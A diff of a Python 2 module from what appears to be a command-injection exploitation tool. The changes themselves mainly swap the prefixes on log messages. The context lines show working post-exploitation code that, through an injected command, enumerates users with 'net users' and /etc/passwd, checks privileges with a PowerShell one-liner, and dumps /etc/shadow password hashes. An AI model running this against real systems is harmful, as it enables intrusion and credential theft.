@@ -53,7 +53,7 @@ def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_
       output_file.write("    (!) The PowerShell's version number is " + ps_version + ".\n")
       output_file.close()
   except ValueError:
-    print "\n" + Fore.YELLOW + "(^) Warning: Heuristics have failed to identify PowerShell's version, which means that some payloads or injection techniques may be failed." + Style.RESET_ALL 
+    print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "Heuristics have failed to identify PowerShell's version, which means that some payloads or injection techniques may be failed." + Style.RESET_ALL 
     settings.PS_ENABLED = False
 
 """
@@ -166,9 +166,9 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
   if settings.TARGET_OS == "win":
     settings.SYS_USERS = settings.WIN_SYS_USERS
     settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
-    # URL encode "+" if POST request and python alternative shell. 
+    # URL encode "+ " if POST request and python alternative shell. 
     if alter_shell and http_request_method == "POST":
-      settings.SYS_USERS = settings.SYS_USERS.replace("+","%2B")
+      settings.SYS_USERS = settings.SYS_USERS.replace("+ ","%2B")
   cmd = settings.SYS_USERS             
   check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
   sys_users = output 
@@ -176,7 +176,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
   if settings.TARGET_OS == "win":
     if menu.options.verbose:
       print ""
-    sys.stdout.write("\n(*) Executing the 'net users' command to enumerate users entries... ")
+    sys.stdout.write("\n" + settings.INFO_SIGN + "Executing the 'net users' command to enumerate users entries... ")
     sys.stdout.flush()
     try:
       if sys_users[0] :
@@ -196,7 +196,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
         for user in range(0, len(sys_users_list)):
           count = count + 1
           if menu.options.privileges:
-            print "(*) Confirming privileges of user '" + sys_users_list[user] + "'... "
+            print settings.INFO_SIGN + "Confirming privileges of user '" + sys_users_list[user] + "'... "
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
             check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
             check_privs = output 
@@ -223,14 +223,14 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
+        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
     except TypeError:
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
       pass
   # Unix-like users enumeration.   
   else:
-    sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+    sys.stdout.write("\n" + settings.INFO_SIGN + "Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
     sys.stdout.flush()
     if sys_users[0] :
       sys_users = "".join(str(p) for p in sys_users).strip()
@@ -242,7 +242,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
       if len(sys_users) % 3 != 0 :
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
+        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
         sys_users = " ".join(str(p) for p in sys_users).strip()
         print sys_users
         output_file = open(filename, "a")
@@ -303,7 +303,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
               output_file.close()
             except ValueError:
               if count == 1 :
-                print Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
+                print Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
               sys_users = " ".join(str(p) for p in sys_users.split(":"))
               print sys_users 
               output_file = open(filename, "a")
@@ -312,7 +312,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
     else:
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
       sys.stdout.flush()
-      print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
+      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
 
 """
 System passwords enumeration
@@ -327,7 +327,7 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
     check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     sys_passes = output 
     if sys_passes :
-      sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+      sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
       sys.stdout.flush()
       sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
@@ -354,7 +354,7 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
           # Check for appropriate '/etc/shadow' format.
           except IndexError:
             if count == 1 :
-              sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
+              sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
             print fields[0]
             output_file = open(filename, "a")
             output_file.write("      " + fields[0])
@@ -362,7 +362,7 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
+        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
 
 """
 Single os-shell execution
